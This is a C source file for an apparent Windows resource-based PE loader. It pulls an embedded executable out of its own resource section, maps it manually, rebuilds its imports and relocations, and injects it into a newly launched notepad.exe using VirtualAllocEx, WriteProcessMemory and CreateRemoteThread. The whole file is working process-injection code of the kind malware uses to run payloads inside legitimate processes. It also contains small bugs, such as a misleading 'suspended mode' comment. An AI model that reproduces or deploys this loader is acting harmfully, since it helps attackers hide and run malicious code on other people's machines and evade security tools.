#pragma once
/*##############################Includes##########################################*/
#include "rloader.h"

/*##############################Function Defentions##############################*/


VOID RLOADER_freeStruct(PINJECT_ENTRY* ppInjectEntry)
{
	PINJECT_ENTRY pTempResourceEntry = *ppInjectEntry;

	if (NULL != pTempResourceEntry->lpPointerToResourceHandle)
	{
		FreeResource(pTempResourceEntry->lpPointerToResourceHandle);
	}

	free(pTempResourceEntry);
}

BOOL RLOADER_findMapInject()
{

	STARTUPINFOA StartUpInfo;
	PROCESS_INFORMATION ProcessInfo;
	HANDLE hThread;

	BOOL bReturnVal = FALSE;

	HRSRC hResource = NULL;
	PINJECT_ENTRY pInjectData = NULL;
	LPVOID pPointerToPayLoadInInjectProc = NULL;

	PIMAGE_NT_HEADERS pNTHeadersInject;
	PIMAGE_DOS_HEADER pBaseAddrInject;

	HMODULE hModule = GetModuleHandle(NULL);

	/*Find our payload in the resource section*/
	printf("Locating payload in resource section!...\n");
	bReturnVal = EnumResourceNamesW(hModule, L"PELOAD", (ENUMRESNAMEPROCW)RLOADER_loadResourceAndCheckPECallback, (LPARAM)&hResource);

	if (FALSE == bReturnVal)
	{
		printf("EnumResourceNames failed! error code: %d\n", GetLastError());
		goto lbl_cleanup;
	}
	

	pInjectData = (PINJECT_ENTRY)malloc(sizeof(INJECT_ENTRY));

	printf("Loading resource payload location!...\n");
	/*Initialize a pointer to point to our resource in the resource section*/
	bReturnVal = RLOADER_LoadResourceMem(hModule, hResource, &pInjectData);

	if (FALSE == bReturnVal)
	{
		goto lbl_cleanup;
	}
	
	printf("Mapping resource to virutal memory!...\n");
	/*Map the resource to memory and intialize the pointer to it*/
	pInjectData->pPayloadMemRet = RLOADER_MapResourceToFile(pInjectData->lpPointerToResourceInMem, &pInjectData);

	if (NULL == pInjectData->pPayloadMemRet)
	{
		goto lbl_cleanup;
	}
	
	ZeroMemory(&StartUpInfo, sizeof(StartUpInfo));
	StartUpInfo.cb = sizeof(StartUpInfo);
	ZeroMemory(&ProcessInfo, sizeof(ProcessInfo));

	printf("Launching notepad(32-bit) version!...\n");
	/*Create a child process in suspended mode for injection*/
	bReturnVal = CreateProcessA(NOTEPAD_PATH, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &StartUpInfo, &ProcessInfo);
	

	if (FALSE == bReturnVal)
	{
		printf("CreateProcessA failed! error code: %d\n", GetLastError());
		goto lbl_cleanup;
	}

	printf("Allocating memory within notepad.exe!...\n");
	/*Allocate memory in the sup process*/
	pPointerToPayLoadInInjectProc = VirtualAllocEx(ProcessInfo.hProcess, NULL, pInjectData->dwSizeOfPayloadInInjectedMem, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	if (NULL == pPointerToPayLoadInInjectProc)
	{
		printf("VirtualAllocEx failed! error code: %d\n", GetLastError());
		goto lbl_cleanup;
	}

	printf("Rebasing memory payload to match address 0x%08x!...\n", pPointerToPayLoadInInjectProc);
	bReturnVal = RLOADER_rebaseReloc(&pInjectData->pPayloadMemRet, pPointerToPayLoadInInjectProc);

	if (FALSE == bReturnVal)
	{
		printf("Failed to relocate the image!\n");
		pPointerToPayLoadInInjectProc = NULL;
		goto lbl_cleanup;
	}

	printf("Copying payload to address 0x%08x!...\n", pPointerToPayLoadInInjectProc);
	bReturnVal = WriteProcessMemory(ProcessInfo.hProcess, pPointerToPayLoadInInjectProc, pInjectData->pPayloadMemRet, pInjectData->dwSizeOfPayloadInInjectedMem, NULL);

	if (FALSE == bReturnVal)
	{
		printf("WriteProcessMemory failed! error code: %d\n", GetLastError());
		goto lbl_cleanup;
	}


	pBaseAddrInject = (PIMAGE_DOS_HEADER)pInjectData->pPayloadMemRet;
	pNTHeadersInject = (PIMAGE_NT_HEADERS)((DWORD)pBaseAddrInject + (DWORD)((PIMAGE_DOS_HEADER)pInjectData->pPayloadMemRet)->e_lfanew);

	pInjectData->pAddressOfEntryPointInjected = (LPVOID)((DWORD)pPointerToPayLoadInInjectProc + pNTHeadersInject->OptionalHeader.AddressOfEntryPoint);

	printf("Preparing injection to load at address 0x%08x!...\n", pInjectData->pAddressOfEntryPointInjected);
	hThread = CreateRemoteThread(ProcessInfo.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pInjectData->pAddressOfEntryPointInjected, NULL, 0, NULL);

	bReturnVal = TRUE;

lbl_cleanup:


	if (NULL != hResource)
	{
		FreeResource(hResource);
	}

	if (NULL != ProcessInfo.hProcess)
	{
		CloseHandle(ProcessInfo.hProcess);
	}

	if (NULL != pInjectData)
	{
		RLOADER_freeStruct(&pInjectData);
	}

	return bReturnVal;
}

BOOL CALLBACK RLOADER_loadResourceAndCheckPECallback(IN HMODULE hModule, IN LPCWSTR lpszType, IN LPWSTR lpszName, IN LONG_PTR lParam)
{
	HRSRC* phResource = (HRSRC*)lParam;
	HRSRC hResource = NULL;
	BOOL bReturnVal = FALSE;

	hResource = FindResourceW(hModule, lpszName, lpszType);
	if (NULL == hResource)
	{
		printf("FindResourceW failed! error code: %d\n", GetLastError());
		goto lbl_cleanup;
	}

	*phResource = hResource;
	bReturnVal = TRUE;

lbl_cleanup:

	return bReturnVal;
}

BOOL RLOADER_LoadResourceMem(HMODULE hModule, HRSRC hResourceHandle, PINJECT_ENTRY * ppInjectEntry)
{

	DWORD dwResourceSize = 0;
	LPVOID pResourceMem = NULL;
	PINJECT_ENTRY pTempResourceEntry = *ppInjectEntry;
	BOOL bReturnVal = FALSE;

	pTempResourceEntry->dwResourceSize = SizeofResource(hModule, hResourceHandle);
	if (FALSE == pTempResourceEntry->dwResourceSize)
	{
		printf("SizeOfResource failed! error code: %d\n", GetLastError());
		CloseHandle(hModule);
		goto lbl_cleanup;
	}

	pTempResourceEntry->lpPointerToResourceHandle = LoadResource(hModule, hResourceHandle);
	if (NULL == pTempResourceEntry->lpPointerToResourceHandle)
	{
		printf("LoadResource failed! error code: %d\n", GetLastError());
		CloseHandle(hModule);
		goto lbl_cleanup;
	}

	pTempResourceEntry->lpPointerToResourceInMem = LockResource(pTempResourceEntry->lpPointerToResourceHandle);
	if (0 == pTempResourceEntry->lpPointerToResourceInMem)
	{
		printf("LockResource failed! error code: %d\n", GetLastError());
		CloseHandle(hModule);
		goto lbl_cleanup;
	}

	bReturnVal = TRUE;

lbl_cleanup:
	return bReturnVal;
}

LPVOID RLOADER_MapResourceToFile(LPVOID lpResourceAddr, PINJECT_ENTRY * ppInjectEntry)
{
	BOOL bReturnVal = FALSE;
	LPVOID pPayloadMemMapped = NULL;
	LPVOID pPayloadMemRet = NULL;
	PINJECT_ENTRY pTempResourceEntry = *ppInjectEntry;
	PIMAGE_SECTION_HEADER pImageSectionHeader = NULL;

	PIMAGE_DOS_HEADER pBaseAddr = (PIMAGE_DOS_HEADER)lpResourceAddr;
	PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((DWORD)pBaseAddr + pBaseAddr->e_lfanew);

	pTempResourceEntry->dwSizeOfPayloadInInjectedMem = pNTHeaders->OptionalHeader.SizeOfImage;
	HANDLE hFileMapping = CreateFileMapping(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, pNTHeaders->OptionalHeader.SizeOfImage, NULL);

	if (NULL == hFileMapping)
	{
		printf("CreateFileMapping failed! error code:%d\n", GetLastError());
		goto lbl_cleanup;
	}

	pPayloadMemMapped = MapViewOfFile(hFileMapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);


	if (NULL == pPayloadMemMapped)
	{
		CloseHandle(hFileMapping);
		printf("MapViewOfFile failed! error code:%d\n", GetLastError());
		goto lbl_cleanup;
	}

	/*
	Copy on the headers
	*/
	CopyMemory(pPayloadMemMapped, pTempResourceEntry->lpPointerToResourceInMem, pNTHeaders->OptionalHeader.SizeOfHeaders);
	
	for (INT nIndex = 0; nIndex < pNTHeaders->FileHeader.NumberOfSections; nIndex++)
	{	
		/*Get the first section within the loaded resource PE*/
		pImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)IMAGE_FIRST_SECTION(pNTHeaders) + (sizeof(IMAGE_SECTION_HEADER) * nIndex));

		/*Get the Virtual Address of the destenation(Virtual Address because we are mapping the PE to memory)*/
		LPVOID pSectionDest = (LPVOID)((DWORD)pPayloadMemMapped + pImageSectionHeader->VirtualAddress);

		/*Get the raw data pointer of the unmapped resource PE*/
		LPVOID pSectionSource = (LPVOID)((DWORD)pBaseAddr + pImageSectionHeader->PointerToRawData);

		CopyMemory(pSectionDest, pSectionSource, pImageSectionHeader->SizeOfRawData);
	}

	pPayloadMemRet = pPayloadMemMapped;

	//UnmapViewOfFile(pPayloadMemMapped);

	bReturnVal = RLOADER_rebuildImportTable(pPayloadMemRet);

	if (FALSE == bReturnVal)
	{
		pPayloadMemRet = NULL;
		goto lbl_cleanup;
	}

	CloseHandle(hFileMapping);

	bReturnVal = TRUE;

lbl_cleanup:
	if (NULL == pPayloadMemMapped)
	{
		CloseHandle(hFileMapping);
	}

	return pPayloadMemRet;
}

BOOL RLOADER_rebuildImportTable(LPVOID pInjectedAddr)
{
	LPCSTR lpLibrary;
	PIMAGE_IMPORT_BY_NAME pName;
	PIMAGE_THUNK_DATA pFirstThunk;
	PIMAGE_THUNK_DATA pOriginalFirstThunk;

	BOOL bReturnVal = FALSE;
	HMODULE hDLLHandle = NULL;

	PIMAGE_DOS_HEADER pBaseAddr = (PIMAGE_DOS_HEADER)pInjectedAddr;
	PIMAGE_NT_HEADERS pIMAGE_NT_HEADER = (PIMAGE_NT_HEADERS)((DWORD)pBaseAddr + pBaseAddr->e_lfanew);
	IMAGE_OPTIONAL_HEADER sOptionalHeader = (pIMAGE_NT_HEADER->OptionalHeader);
	IMAGE_DATA_DIRECTORY sEntryImport = sOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

	PIMAGE_IMPORT_DESCRIPTOR sImportDescriptorEntryInMemory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)(pBaseAddr)+sEntryImport.VirtualAddress);

	for (; NULL != sImportDescriptorEntryInMemory->Name; sImportDescriptorEntryInMemory++)
	{
		lpLibrary = ((LPCSTR)(pBaseAddr)+sImportDescriptorEntryInMemory->Name);
		hDLLHandle = LoadLibraryA(lpLibrary);

		if (NULL == hDLLHandle)
		{
			CloseHandle(hDLLHandle);
			goto lbl_cleanup;
		}

		pOriginalFirstThunk = (PIMAGE_THUNK_DATA)((DWORD)(pBaseAddr)+(DWORD)(sImportDescriptorEntryInMemory->OriginalFirstThunk));
		pFirstThunk = (PIMAGE_THUNK_DATA)((DWORD)(pBaseAddr)+(DWORD)(sImportDescriptorEntryInMemory->FirstThunk));

		for (; 0 != (DWORD)(pOriginalFirstThunk->u1.AddressOfData); pOriginalFirstThunk++, pFirstThunk++)
		{

			//Is high bit of OriginalFirstThunk set?
			if (pOriginalFirstThunk->u1.AddressOfData & IMAGE_ORDINAL_FLAG)
			{
				// Resolve by oridinal
				*(FARPROC*)(pFirstThunk) = GetProcAddress(hDLLHandle, MAKEINTRESOURCEA(pOriginalFirstThunk->u1.AddressOfData));
			}
			else
			{
				//Resolve by name
				pName = (PIMAGE_IMPORT_BY_NAME)((DWORD)(pBaseAddr)+(DWORD)(pFirstThunk->u1.AddressOfData));
				*(FARPROC*)(pFirstThunk) = GetProcAddress(hDLLHandle, (LPCSTR)pName->Name);
			}

			if (NULL == *(FARPROC*)(pFirstThunk))
			{
				printf("GetProcAddress failed! error code: %d\n", GetLastError());
				goto lbl_cleanup;
			}

		}

		FreeLibrary(hDLLHandle);
	}

	bReturnVal = TRUE;

lbl_cleanup:
	if (NULL != hDLLHandle)
	{
		FreeLibrary(hDLLHandle);
	}
	return bReturnVal;
}

BOOL RLOADER_rebaseReloc(LPVOID * pPayLoadMapped, LPVOID pInjectedAddr)
{

	PIMAGE_DOS_HEADER pBaseAddr = (PIMAGE_DOS_HEADER)(*pPayLoadMapped);
	PIMAGE_NT_HEADERS pIMAGE_NT_HEADER = (PIMAGE_NT_HEADERS)((DWORD)pBaseAddr + pBaseAddr->e_lfanew);
	IMAGE_OPTIONAL_HEADER sOptionalHeader = (pIMAGE_NT_HEADER->OptionalHeader);

	/*Get the delta of the PE, this is then added to the default ImageBase*/
	DWORD dwDelta = (DWORD)pInjectedAddr - sOptionalHeader.ImageBase;
	PDWORD pdwReloc = NULL;
	BOOL bReturnVal = FALSE;

	/*Get the first relocation table*/
	PIMAGE_BASE_RELOCATION pRelocStart = (PIMAGE_BASE_RELOCATION)((DWORD)pBaseAddr + sOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);
	PIMAGE_BASE_RELOCATION pRelocEnd = (PIMAGE_BASE_RELOCATION)((DWORD)pRelocStart + sOptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size - sizeof(IMAGE_BASE_RELOCATION));

	for (; pRelocStart < pRelocEnd; pRelocStart = (PIMAGE_BASE_RELOCATION)((DWORD)pRelocStart + pRelocStart->SizeOfBlock))
	{
		/*Get the first item*/
		PWORD pwItem = (PWORD)(pRelocStart + 1);

		/*Get the amount of items in the block = (SizeOfBlock - Header) / SizeOfEachItem*/
		DWORD dwNumberOfItems = (pRelocStart->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);

		for (DWORD nIndex = 0; nIndex < dwNumberOfItems; nIndex++, pwItem++)
		{
			switch (*pwItem >> 12)
			{
				case IMAGE_REL_BASED_ABSOLUTE:
					break;
				case IMAGE_REL_BASED_HIGHLOW:
					/*Locate the address which needs to be relocated. pdwReloc = Base + BlockLocation + (Last 12 bits of block)*/
					pdwReloc = (PDWORD)((DWORD)pBaseAddr + pRelocStart->VirtualAddress + (*pwItem & 0xfff));
					*pdwReloc += dwDelta;
					break;
				default:
					return bReturnVal;
			}
		}
	}
	bReturnVal = TRUE;

	return bReturnVal;
}